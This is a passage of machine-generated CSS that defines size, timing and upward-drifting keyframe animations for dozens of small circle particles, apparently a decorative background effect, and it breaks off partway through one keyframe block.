.circle-container:nth-child(30) .circle {
  -webkit-animation-delay: 1997ms;
          animation-delay: 1997ms;
}
.circle-container:nth-child(31) {
  width: 7px;
  height: 7px;
  -webkit-animation-name: move-frames-31;
          animation-name: move-frames-31;
  -webkit-animation-duration: 32870ms;
          animation-duration: 32870ms;
  -webkit-animation-delay: 16274ms;
          animation-delay: 16274ms;
}
@-webkit-keyframes move-frames-31 {
  from {
    -webkit-transform: translate3d(37vw, 104vh, 0);
            transform: translate3d(37vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(24vw, -122vh, 0);
            transform: translate3d(24vw, -122vh, 0);
  }
}
@keyframes move-frames-31 {
  from {
    -webkit-transform: translate3d(37vw, 104vh, 0);
            transform: translate3d(37vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(24vw, -122vh, 0);
            transform: translate3d(24vw, -122vh, 0);
  }
}
.circle-container:nth-child(31) .circle {
  -webkit-animation-delay: 2250ms;
          animation-delay: 2250ms;
}
.circle-container:nth-child(32) {
  width: 8px;
  height: 8px;
  -webkit-animation-name: move-frames-32;
          animation-name: move-frames-32;
  -webkit-animation-duration: 29374ms;
          animation-duration: 29374ms;
  -webkit-animation-delay: 25317ms;
          animation-delay: 25317ms;
}
@-webkit-keyframes move-frames-32 {
  from {
    -webkit-transform: translate3d(95vw, 102vh, 0);
            transform: translate3d(95vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(13vw, -116vh, 0);
            transform: translate3d(13vw, -116vh, 0);
  }
}
@keyframes move-frames-32 {
  from {
    -webkit-transform: translate3d(95vw, 102vh, 0);
            transform: translate3d(95vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(13vw, -116vh, 0);
            transform: translate3d(13vw, -116vh, 0);
  }
}
.circle-container:nth-child(32) .circle {
  -webkit-animation-delay: 3599ms;
          animation-delay: 3599ms;
}
.circle-container:nth-child(33) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-33;
          animation-name: move-frames-33;
  -webkit-animation-duration: 36067ms;
          animation-duration: 36067ms;
  -webkit-animation-delay: 30708ms;
          animation-delay: 30708ms;
}
@-webkit-keyframes move-frames-33 {
  from {
    -webkit-transform: translate3d(80vw, 109vh, 0);
            transform: translate3d(80vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(73vw, -137vh, 0);
            transform: translate3d(73vw, -137vh, 0);
  }
}
@keyframes move-frames-33 {
  from {
    -webkit-transform: translate3d(80vw, 109vh, 0);
            transform: translate3d(80vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(73vw, -137vh, 0);
            transform: translate3d(73vw, -137vh, 0);
  }
}
.circle-container:nth-child(33) .circle {
  -webkit-animation-delay: 1443ms;
          animation-delay: 1443ms;
}
.circle-container:nth-child(34) {
  width: 4px;
  height: 4px;
  -webkit-animation-name: move-frames-34;
          animation-name: move-frames-34;
  -webkit-animation-duration: 33548ms;
          animation-duration: 33548ms;
  -webkit-animation-delay: 4161ms;
          animation-delay: 4161ms;
}
@-webkit-keyframes move-frames-34 {
  from {
    -webkit-transform: translate3d(41vw, 101vh, 0);
            transform: translate3d(41vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(67vw, -130vh, 0);
            transform: translate3d(67vw, -130vh, 0);
  }
}
@keyframes move-frames-34 {
  from {
    -webkit-transform: translate3d(41vw, 101vh, 0);
            transform: translate3d(41vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(67vw, -130vh, 0);
            transform: translate3d(67vw, -130vh, 0);
  }
}
.circle-container:nth-child(34) .circle {
  -webkit-animation-delay: 452ms;
          animation-delay: 452ms;
}
.circle-container:nth-child(35) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-35;
          animation-name: move-frames-35;
  -webkit-animation-duration: 32477ms;
          animation-duration: 32477ms;
  -webkit-animation-delay: 2842ms;
          animation-delay: 2842ms;
}
@-webkit-keyframes move-frames-35 {
  from {
    -webkit-transform: translate3d(60vw, 106vh, 0);
            transform: translate3d(60vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(99vw, -123vh, 0);
            transform: translate3d(99vw, -123vh, 0);
  }
}
@keyframes move-frames-35 {
  from {
    -webkit-transform: translate3d(60vw, 106vh, 0);
            transform: translate3d(60vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(99vw, -123vh, 0);
            transform: translate3d(99vw, -123vh, 0);
  }
}
.circle-container:nth-child(35) .circle {
  -webkit-animation-delay: 2791ms;
          animation-delay: 2791ms;
}
.circle-container:nth-child(36) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-36;
          animation-name: move-frames-36;
  -webkit-animation-duration: 32899ms;
          animation-duration: 32899ms;
  -webkit-animation-delay: 23928ms;
          animation-delay: 23928ms;
}
@-webkit-keyframes move-frames-36 {
  from {
    -webkit-transform: translate3d(62vw, 106vh, 0);
            transform: translate3d(62vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(48vw, -117vh, 0);
            transform: translate3d(48vw, -117vh, 0);
  }
}
@keyframes move-frames-36 {
  from {
    -webkit-transform: translate3d(62vw, 106vh, 0);
            transform: translate3d(62vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(48vw, -117vh, 0);
            transform: translate3d(48vw, -117vh, 0);
  }
}
.circle-container:nth-child(36) .circle {
  -webkit-animation-delay: 1520ms;
          animation-delay: 1520ms;
}
.circle-container:nth-child(37) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-37;
          animation-name: move-frames-37;
  -webkit-animation-duration: 34681ms;
          animation-duration: 34681ms;
  -webkit-animation-delay: 34768ms;
          animation-delay: 34768ms;
}
@-webkit-keyframes move-frames-37 {
  from {
    -webkit-transform: translate3d(47vw, 103vh, 0);
            transform: translate3d(47vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(57vw, -131vh, 0);
            transform: translate3d(57vw, -131vh, 0);
  }
}
@keyframes move-frames-37 {
  from {
    -webkit-transform: translate3d(47vw, 103vh, 0);
            transform: translate3d(47vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(57vw, -131vh, 0);
            transform: translate3d(57vw, -131vh, 0);
  }
}
.circle-container:nth-child(37) .circle {
  -webkit-animation-delay: 2663ms;
          animation-delay: 2663ms;
}
.circle-container:nth-child(38) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-38;
          animation-name: move-frames-38;
  -webkit-animation-duration: 28536ms;
          animation-duration: 28536ms;
  -webkit-animation-delay: 33197ms;
          animation-delay: 33197ms;
}
@-webkit-keyframes move-frames-38 {
  from {
    -webkit-transform: translate3d(60vw, 102vh, 0);
            transform: translate3d(60vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(80vw, -122vh, 0);
            transform: translate3d(80vw, -122vh, 0);
  }
}
@keyframes move-frames-38 {
  from {
    -webkit-transform: translate3d(60vw, 102vh, 0);
            transform: translate3d(60vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(80vw, -122vh, 0);
            transform: translate3d(80vw, -122vh, 0);
  }
}
.circle-container:nth-child(38) .circle {
  -webkit-animation-delay: 3765ms;
          animation-delay: 3765ms;
}
.circle-container:nth-child(39) {
  width: 8px;
  height: 8px;
  -webkit-animation-name: move-frames-39;
          animation-name: move-frames-39;
  -webkit-animation-duration: 31986ms;
          animation-duration: 31986ms;
  -webkit-animation-delay: 21765ms;
          animation-delay: 21765ms;
}
@-webkit-keyframes move-frames-39 {
  from {
    -webkit-transform: translate3d(72vw, 104vh, 0);
            transform: translate3d(72vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(39vw, -119vh, 0);
            transform: translate3d(39vw, -119vh, 0);
  }
}
@keyframes move-frames-39 {
  from {
    -webkit-transform: translate3d(72vw, 104vh, 0);
            transform: translate3d(72vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(39vw, -119vh, 0);
            transform: translate3d(39vw, -119vh, 0);
  }
}
.circle-container:nth-child(39) .circle {
  -webkit-animation-delay: 810ms;
          animation-delay: 810ms;
}
.circle-container:nth-child(40) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-40;
          animation-name: move-frames-40;
  -webkit-animation-duration: 30141ms;
          animation-duration: 30141ms;
  -webkit-animation-delay: 19821ms;
          animation-delay: 19821ms;
}
@-webkit-keyframes move-frames-40 {
  from {
    -webkit-transform: translate3d(18vw, 108vh, 0);
            transform: translate3d(18vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(16vw, -138vh, 0);
            transform: translate3d(16vw, -138vh, 0);
  }
}
@keyframes move-frames-40 {
  from {
    -webkit-transform: translate3d(18vw, 108vh, 0);
            transform: translate3d(18vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(16vw, -138vh, 0);
            transform: translate3d(16vw, -138vh, 0);
  }
}
.circle-container:nth-child(40) .circle {
  -webkit-animation-delay: 3564ms;
          animation-delay: 3564ms;
}
.circle-container:nth-child(41) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-41;
          animation-name: move-frames-41;
  -webkit-animation-duration: 32531ms;
          animation-duration: 32531ms;
  -webkit-animation-delay: 6788ms;
          animation-delay: 6788ms;
}
@-webkit-keyframes move-frames-41 {
  from {
    -webkit-transform: translate3d(27vw, 105vh, 0);
            transform: translate3d(27vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(68vw, -125vh, 0);
            transform: translate3d(68vw, -125vh, 0);
  }
}
@keyframes move-frames-41 {
  from {
    -webkit-transform: translate3d(27vw, 105vh, 0);
            transform: translate3d(27vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(68vw, -125vh, 0);
            transform: translate3d(68vw, -125vh, 0);
  }
}
.circle-container:nth-child(41) .circle {
  -webkit-animation-delay: 669ms;
          animation-delay: 669ms;
}
.circle-container:nth-child(42) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-42;
          animation-name: move-frames-42;
  -webkit-animation-duration: 32959ms;
          animation-duration: 32959ms;
  -webkit-animation-delay: 3766ms;
          animation-delay: 3766ms;
}
@-webkit-keyframes move-frames-42 {
  from {
    -webkit-transform: translate3d(36vw, 101vh, 0);
            transform: translate3d(36vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(67vw, -121vh, 0);
            transform: translate3d(67vw, -121vh, 0);
  }
}
@keyframes move-frames-42 {
  from {
    -webkit-transform: translate3d(36vw, 101vh, 0);
            transform: translate3d(36vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(67vw, -121vh, 0);
            transform: translate3d(67vw, -121vh, 0);
  }
}
.circle-container:nth-child(42) .circle {
  -webkit-animation-delay: 3824ms;
          animation-delay: 3824ms;
}
.circle-container:nth-child(43) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-43;
          animation-name: move-frames-43;
  -webkit-animation-duration: 29453ms;
          animation-duration: 29453ms;
  -webkit-animation-delay: 19534ms;
          animation-delay: 19534ms;
}
@-webkit-keyframes move-frames-43 {
  from {
    -webkit-transform: translate3d(70vw, 110vh, 0);
            transform: translate3d(70vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(55vw, -132vh, 0);
            transform: translate3d(55vw, -132vh, 0);
  }
}
@keyframes move-frames-43 {
  from {
    -webkit-transform: translate3d(70vw, 110vh, 0);
            transform: translate3d(70vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(55vw, -132vh, 0);
            transform: translate3d(55vw, -132vh, 0);
  }
}
.circle-container:nth-child(43) .circle {
  -webkit-animation-delay: 2487ms;
          animation-delay: 2487ms;
}
.circle-container:nth-child(44) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-44;
          animation-name: move-frames-44;
  -webkit-animation-duration: 29341ms;
          animation-duration: 29341ms;
  -webkit-animation-delay: 23186ms;
          animation-delay: 23186ms;
}
@-webkit-keyframes move-frames-44 {
  from {
    -webkit-transform: translate3d(5vw, 106vh, 0);
            transform: translate3d(5vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(86vw, -120vh, 0);
            transform: translate3d(86vw, -120vh, 0);
  }
}
@keyframes move-frames-44 {
  from {
    -webkit-transform: translate3d(5vw, 106vh, 0);
            transform: translate3d(5vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(86vw, -120vh, 0);
            transform: translate3d(86vw, -120vh, 0);
  }
}
.circle-container:nth-child(44) .circle {
  -webkit-animation-delay: 2201ms;
          animation-delay: 2201ms;
}
.circle-container:nth-child(45) {
  width: 8px;
  height: 8px;
  -webkit-animation-name: move-frames-45;
          animation-name: move-frames-45;
  -webkit-animation-duration: 29166ms;
          animation-duration: 29166ms;
  -webkit-animation-delay: 23812ms;
          animation-delay: 23812ms;
}
@-webkit-keyframes move-frames-45 {
  from {
    -webkit-transform: translate3d(78vw, 107vh, 0);
            transform: translate3d(78vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(71vw, -125vh, 0);
            transform: translate3d(71vw, -125vh, 0);
  }
}
@keyframes move-frames-45 {
  from {
    -webkit-transform: translate3d(78vw, 107vh, 0);
            transform: translate3d(78vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(71vw, -125vh, 0);
            transform: translate3d(71vw, -125vh, 0);
  }
}
.circle-container:nth-child(45) .circle {
  -webkit-animation-delay: 3989ms;
          animation-delay: 3989ms;
}
.circle-container:nth-child(46) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-46;
          animation-name: move-frames-46;
  -webkit-animation-duration: 36158ms;
          animation-duration: 36158ms;
  -webkit-animation-delay: 13666ms;
          animation-delay: 13666ms;
}
@-webkit-keyframes move-frames-46 {
  from {
    -webkit-transform: translate3d(57vw, 107vh, 0);
            transform: translate3d(57vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(30vw, -134vh, 0);
            transform: translate3d(30vw, -134vh, 0);
  }
}
@keyframes move-frames-46 {
  from {
    -webkit-transform: translate3d(57vw, 107vh, 0);
            transform: translate3d(57vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(30vw, -134vh, 0);
            transform: translate3d(30vw, -134vh, 0);
  }
}
.circle-container:nth-child(46) .circle {
  -webkit-animation-delay: 2571ms;
          animation-delay: 2571ms;
}
.circle-container:nth-child(47) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-47;
          animation-name: move-frames-47;
  -webkit-animation-duration: 31689ms;
          animation-duration: 31689ms;
  -webkit-animation-delay: 15017ms;
          animation-delay: 15017ms;
}
@-webkit-keyframes move-frames-47 {
  from {
    -webkit-transform: translate3d(71vw, 108vh, 0);
            transform: translate3d(71vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(14vw, -109vh, 0);
            transform: translate3d(14vw, -109vh, 0);
  }
}
@keyframes move-frames-47 {
  from {
    -webkit-transform: translate3d(71vw, 108vh, 0);
            transform: translate3d(71vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(14vw, -109vh, 0);
            transform: translate3d(14vw, -109vh, 0);
  }
}
.circle-container:nth-child(47) .circle {
  -webkit-animation-delay: 6ms;
          animation-delay: 6ms;
}
.circle-container:nth-child(48) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-48;
          animation-name: move-frames-48;
  -webkit-animation-duration: 30573ms;
          animation-duration: 30573ms;
  -webkit-animation-delay: 1488ms;
          animation-delay: 1488ms;
}
@-webkit-keyframes move-frames-48 {
  from {
    -webkit-transform: translate3d(85vw, 110vh, 0);
            transform: translate3d(85vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(88vw, -126vh, 0);
            transform: translate3d(88vw, -126vh, 0);
  }
}
@keyframes move-frames-48 {
  from {
    -webkit-transform: translate3d(85vw, 110vh, 0);
            transform: translate3d(85vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(88vw, -126vh, 0);
            transform: translate3d(88vw, -126vh, 0);
  }
}
.circle-container:nth-child(48) .circle {
  -webkit-animation-delay: 23ms;
          animation-delay: 23ms;
}
.circle-container:nth-child(49) {
  width: 8px;
  height: 8px;
  -webkit-animation-name: move-frames-49;
          animation-name: move-frames-49;
  -webkit-animation-duration: 28144ms;
          animation-duration: 28144ms;
  -webkit-animation-delay: 13370ms;
          animation-delay: 13370ms;
}
@-webkit-keyframes move-frames-49 {
  from {
    -webkit-transform: translate3d(11vw, 105vh, 0);
            transform: translate3d(11vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(31vw, -123vh, 0);
            transform: translate3d(31vw, -123vh, 0);
  }
}
@keyframes move-frames-49 {
  from {
    -webkit-transform: translate3d(11vw, 105vh, 0);
            transform: translate3d(11vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(31vw, -123vh, 0);
            transform: translate3d(31vw, -123vh, 0);
  }
}
.circle-container:nth-child(49) .circle {
  -webkit-animation-delay: 3039ms;
          animation-delay: 3039ms;
}
.circle-container:nth-child(50) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-50;
          animation-name: move-frames-50;
  -webkit-animation-duration: 30046ms;
          animation-duration: 30046ms;
  -webkit-animation-delay: 13084ms;
          animation-delay: 13084ms;
}
@-webkit-keyframes move-frames-50 {
  from {
    -webkit-transform: translate3d(25vw, 109vh, 0);
            transform: translate3d(25vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(65vw, -123vh, 0);
            transform: translate3d(65vw, -123vh, 0);
  }
}
@keyframes move-frames-50 {
  from {
    -webkit-transform: translate3d(25vw, 109vh, 0);
            transform: translate3d(25vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(65vw, -123vh, 0);
            transform: translate3d(65vw, -123vh, 0);
  }
}
.circle-container:nth-child(50) .circle {
  -webkit-animation-delay: 1550ms;
          animation-delay: 1550ms;
}
.circle-container:nth-child(51) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-51;
          animation-name: move-frames-51;
  -webkit-animation-duration: 30958ms;
          animation-duration: 30958ms;
  -webkit-animation-delay: 31815ms;
          animation-delay: 31815ms;
}
@-webkit-keyframes move-frames-51 {
  from {
    -webkit-transform: translate3d(5vw, 109vh, 0);
            transform: translate3d(5vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(28vw, -121vh, 0);
            transform: translate3d(28vw, -121vh, 0);
  }
}
@keyframes move-frames-51 {
  from {
    -webkit-transform: translate3d(5vw, 109vh, 0);
            transform: translate3d(5vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(28vw, -121vh, 0);
            transform: translate3d(28vw, -121vh, 0);
  }
}
.circle-container:nth-child(51) .circle {
  -webkit-animation-delay: 1378ms;
          animation-delay: 1378ms;
}
.circle-container:nth-child(52) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-52;
          animation-name: move-frames-52;
  -webkit-animation-duration: 34753ms;
          animation-duration: 34753ms;
  -webkit-animation-delay: 19468ms;
          animation-delay: 19468ms;
}
@-webkit-keyframes move-frames-52 {
  from {
    -webkit-transform: translate3d(4vw, 101vh, 0);
            transform: translate3d(4vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(52vw, -112vh, 0);
            transform: translate3d(52vw, -112vh, 0);
  }
}
@keyframes move-frames-52 {
  from {
    -webkit-transform: translate3d(4vw, 101vh, 0);
            transform: translate3d(4vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(52vw, -112vh, 0);
            transform: translate3d(52vw, -112vh, 0);
  }
}
.circle-container:nth-child(52) .circle {
  -webkit-animation-delay: 1230ms;
          animation-delay: 1230ms;
}
.circle-container:nth-child(53) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-53;
          animation-name: move-frames-53;
  -webkit-animation-duration: 31731ms;
          animation-duration: 31731ms;
  -webkit-animation-delay: 17402ms;
          animation-delay: 17402ms;
}
@-webkit-keyframes move-frames-53 {
  from {
    -webkit-transform: translate3d(27vw, 106vh, 0);
            transform: translate3d(27vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(22vw, -109vh, 0);
            transform: translate3d(22vw, -109vh, 0);
  }
}
@keyframes move-frames-53 {
  from {
    -webkit-transform: translate3d(27vw, 106vh, 0);
            transform: translate3d(27vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(22vw, -109vh, 0);
            transform: translate3d(22vw, -109vh, 0);
  }
}
.circle-container:nth-child(53) .circle {
  -webkit-animation-delay: 2147ms;
          animation-delay: 2147ms;
}
.circle-container:nth-child(54) {
  width: 8px;
  height: 8px;
  -webkit-animation-name: move-frames-54;
          animation-name: move-frames-54;
  -webkit-animation-duration: 31078ms;
          animation-duration: 31078ms;
  -webkit-animation-delay: 9865ms;
          animation-delay: 9865ms;
}
@-webkit-keyframes move-frames-54 {
  from {
    -webkit-transform: translate3d(75vw, 106vh, 0);
            transform: translate3d(75vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(37vw, -134vh, 0);
            transform: translate3d(37vw, -134vh, 0);
  }
}
@keyframes move-frames-54 {
  from {
    -webkit-transform: translate3d(75vw, 106vh, 0);
            transform: translate3d(75vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(37vw, -134vh, 0);
            transform: translate3d(37vw, -134vh, 0);
  }
}
.circle-container:nth-child(54) .circle {
  -webkit-animation-delay: 590ms;
          animation-delay: 590ms;
}
.circle-container:nth-child(55) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-55;
          animation-name: move-frames-55;
  -webkit-animation-duration: 30449ms;
          animation-duration: 30449ms;
  -webkit-animation-delay: 7852ms;
          animation-delay: 7852ms;
}
@-webkit-keyframes move-frames-55 {
  from {
    -webkit-transform: translate3d(67vw, 106vh, 0);
            transform: translate3d(67vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(17vw, -117vh, 0);
            transform: translate3d(17vw, -117vh, 0);
  }
}
@keyframes move-frames-55 {
  from {
    -webkit-transform: translate3d(67vw, 106vh, 0);
            transform: translate3d(67vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(17vw, -117vh, 0);
            transform: translate3d(17vw, -117vh, 0);
  }
}
.circle-container:nth-child(55) .circle {
  -webkit-animation-delay: 3890ms;
          animation-delay: 3890ms;
}
.circle-container:nth-child(56) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-56;
          animation-name: move-frames-56;
  -webkit-animation-duration: 33956ms;
          animation-duration: 33956ms;
  -webkit-animation-delay: 33440ms;
          animation-delay: 33440ms;
}
@-webkit-keyframes move-frames-56 {
  from {
    -webkit-transform: translate3d(67vw, 109vh, 0);
            transform: translate3d(67vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(8vw, -128vh, 0);
            transform: translate3d(8vw, -128vh, 0);
  }
}
@keyframes move-frames-56 {
  from {
    -webkit-transform: translate3d(67vw, 109vh, 0);
            transform: translate3d(67vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(8vw, -128vh, 0);
            transform: translate3d(8vw, -128vh, 0);
  }
}
.circle-container:nth-child(56) .circle {
  -webkit-animation-delay: 2595ms;
          animation-delay: 2595ms;
}
.circle-container:nth-child(57) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-57;
          animation-name: move-frames-57;
  -webkit-animation-duration: 29384ms;
          animation-duration: 29384ms;
  -webkit-animation-delay: 18395ms;
          animation-delay: 18395ms;
}
@-webkit-keyframes move-frames-57 {
  from {
    -webkit-transform: translate3d(91vw, 107vh, 0);
            transform: translate3d(91vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(92vw, -126vh, 0);
            transform: translate3d(92vw, -126vh, 0);
  }
}
@keyframes move-frames-57 {
  from {
    -webkit-transform: translate3d(91vw, 107vh, 0);
            transform: translate3d(91vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(92vw, -126vh, 0);
            transform: translate3d(92vw, -126vh, 0);
  }
}
.circle-container:nth-child(57) .circle {
  -webkit-animation-delay: 1336ms;
          animation-delay: 1336ms;
}
.circle-container:nth-child(58) {
  width: 7px;
  height: 7px;
  -webkit-animation-name: move-frames-58;
          animation-name: move-frames-58;
  -webkit-animation-duration: 29549ms;
          animation-duration: 29549ms;
  -webkit-animation-delay: 9011ms;
          animation-delay: 9011ms;
}
@-webkit-keyframes move-frames-58 {
  from {
    -webkit-transform: translate3d(42vw, 104vh, 0);
            transform: translate3d(42vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(92vw, -106vh, 0);
            transform: translate3d(92vw, -106vh, 0);
  }
}
@keyframes move-frames-58 {
  from {
    -webkit-transform: translate3d(42vw, 104vh, 0);
            transform: translate3d(42vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(92vw, -106vh, 0);
            transform: translate3d(92vw, -106vh, 0);
  }
}
.circle-container:nth-child(58) .circle {
  -webkit-animation-delay: 142ms;
          animation-delay: 142ms;
}
.circle-container:nth-child(59) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-59;
          animation-name: move-frames-59;
  -webkit-animation-duration: 28098ms;
          animation-duration: 28098ms;
  -webkit-animation-delay: 12540ms;
          animation-delay: 12540ms;
}
@-webkit-keyframes move-frames-59 {
  from {
    -webkit-transform: translate3d(7vw, 101vh, 0);
            transform: translate3d(7vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(50vw, -107vh, 0);
            transform: translate3d(50vw, -107vh, 0);
  }
}
@keyframes move-frames-59 {
  from {
    -webkit-transform: translate3d(7vw, 101vh, 0);
            transform: translate3d(7vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(50vw, -107vh, 0);
            transform: translate3d(50vw, -107vh, 0);
  }
}
.circle-container:nth-child(59) .circle {
  -webkit-animation-delay: 1743ms;
          animation-delay: 1743ms;
}
.circle-container:nth-child(60) {
  width: 4px;
  height: 4px;
  -webkit-animation-name: move-frames-60;
          animation-name: move-frames-60;
  -webkit-animation-duration: 30932ms;
          animation-duration: 30932ms;
  -webkit-animation-delay: 5853ms;
          animation-delay: 5853ms;
}
@-webkit-keyframes move-frames-60 {
  from {
    -webkit-transform: translate3d(77vw, 108vh, 0);
            transform: translate3d(77vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(82vw, -128vh, 0);
            transform: translate3d(82vw, -128vh, 0);
  }
}
@keyframes move-frames-60 {
  from {
    -webkit-transform: translate3d(77vw, 108vh, 0);
            transform: translate3d(77vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(82vw, -128vh, 0);
            transform: translate3d(82vw, -128vh, 0);
  }
}
.circle-container:nth-child(60) .circle {
  -webkit-animation-delay: 311ms;
          animation-delay: 311ms;
}
.circle-container:nth-child(61) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-61;
          animation-name: move-frames-61;
  -webkit-animation-duration: 30784ms;
          animation-duration: 30784ms;
  -webkit-animation-delay: 36454ms;
          animation-delay: 36454ms;
}
@-webkit-keyframes move-frames-61 {
  from {
    -webkit-transform: translate3d(20vw, 102vh, 0);
            transform: translate3d(20vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(67vw, -104vh, 0);
            transform: translate3d(67vw, -104vh, 0);
  }
}
@keyframes move-frames-61 {
  from {
    -webkit-transform: translate3d(20vw, 102vh, 0);
            transform: translate3d(20vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(67vw, -104vh, 0);
            transform: translate3d(67vw, -104vh, 0);
  }
}
.circle-container:nth-child(61) .circle {
  -webkit-animation-delay: 451ms;
          animation-delay: 451ms;
}
.circle-container:nth-child(62) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-62;
          animation-name: move-frames-62;
  -webkit-animation-duration: 36715ms;
          animation-duration: 36715ms;
  -webkit-animation-delay: 17149ms;
          animation-delay: 17149ms;
}
@-webkit-keyframes move-frames-62 {
  from {
    -webkit-transform: translate3d(4vw, 110vh, 0);
            transform: translate3d(4vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(50vw, -125vh, 0);
            transform: translate3d(50vw, -125vh, 0);
  }
}
@keyframes move-frames-62 {
  from {
    -webkit-transform: translate3d(4vw, 110vh, 0);
            transform: translate3d(4vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(50vw, -125vh, 0);
            transform: translate3d(50vw, -125vh, 0);
  }
}
.circle-container:nth-child(62) .circle {
  -webkit-animation-delay: 149ms;
          animation-delay: 149ms;
}
.circle-container:nth-child(63) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-63;
          animation-name: move-frames-63;
  -webkit-animation-duration: 30177ms;
          animation-duration: 30177ms;
  -webkit-animation-delay: 20276ms;
          animation-delay: 20276ms;
}
@-webkit-keyframes move-frames-63 {
  from {
    -webkit-transform: translate3d(56vw, 108vh, 0);
            transform: translate3d(56vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(98vw, -130vh, 0);
            transform: translate3d(98vw, -130vh, 0);
  }
}
@keyframes move-frames-63 {
  from {
    -webkit-transform: translate3d(56vw, 108vh, 0);
            transform: translate3d(56vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(98vw, -130vh, 0);
            transform: translate3d(98vw, -130vh, 0);
  }
}
.circle-container:nth-child(63) .circle {
  -webkit-animation-delay: 763ms;
          animation-delay: 763ms;
}
.circle-container:nth-child(64) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-64;
          animation-name: move-frames-64;
  -webkit-animation-duration: 29243ms;
          animation-duration: 29243ms;
  -webkit-animation-delay: 27175ms;
          animation-delay: 27175ms;
}
@-webkit-keyframes move-frames-64 {
  from {
    -webkit-transform: translate3d(62vw, 110vh, 0);
            transform: translate3d(62vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(19vw, -136vh, 0);
